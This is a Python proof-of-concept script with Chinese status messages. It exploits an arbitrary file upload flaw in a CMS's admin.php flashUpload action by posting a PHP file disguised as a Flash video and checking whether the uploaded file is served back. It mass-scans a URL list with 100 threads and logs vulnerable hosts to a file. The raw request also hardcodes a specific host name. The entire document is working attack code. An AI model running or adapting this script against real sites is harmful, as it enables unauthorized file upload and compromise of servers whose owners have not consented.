import requests,argparse,sys,requests_raw # type: ignore
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    data = 'POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1\r\nHost: wm.aqwy.com.cn\r\nUser-Agent: python-requests/2.24.0\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: */*\r\nConnection: close\r\nContent-Type: multipart/form-data; boundary=----aaa\r\nContent-Length: 138\r\n\r\n------aaa\r\nContent-Disposition: form-data; name="filePath"; filename="t33.php"\r\nContent-Type: video/x-flv\r\n\r\nshell\r\n------aaa\r\n'
    rsp1 = requests.get(url=target,verify=False)
    if rsp1.status_code == 200:
        rsp2 = requests_raw.raw(url=target,data=data,verify=False)
        geturl = target+"/"+rsp2.text.replace("MAIN_URL_ROOT", "cms")
        rsp3  = requests.get(url=geturl,verify=False)
        if 'shell' in rsp3.text:
            print(f'[+]{target}存在任意文件上传')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在任意文件上传')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()